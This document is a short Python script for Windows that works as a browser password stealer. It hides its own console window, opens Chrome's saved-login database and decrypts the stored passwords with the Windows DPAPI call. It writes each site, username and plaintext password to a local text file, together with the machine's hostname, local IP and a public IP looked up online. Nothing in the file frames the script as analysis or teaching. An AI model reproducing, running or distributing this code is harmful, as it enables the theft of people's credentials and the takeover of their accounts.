from os import getenv
import sqlite3
import win32crypt
import win32console
import win32gui
import socket
from requests import get

window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor() 
name = socket.gethostname()    
localIP = socket.gethostbyname(name)
globalIP = get("https://api.ipify.org").text


cursor.execute("Select action_url, username_value, password_value FROM logins")
fp = open(r"file.txt", "a+")
fp.write("\n Host: " + name)
fp.write("\n Local: " + localIP)
fp.write("\n Global: " + globalIP)
fp.write("\n")

for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
    if password:
        fp.write("\n The website is " + result[0])
        fp.write("\n The Username is " + result[1])
        fp.write("\n The password is " + str(password.decode("utf-8")))
        fp.write("\n")
        
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")

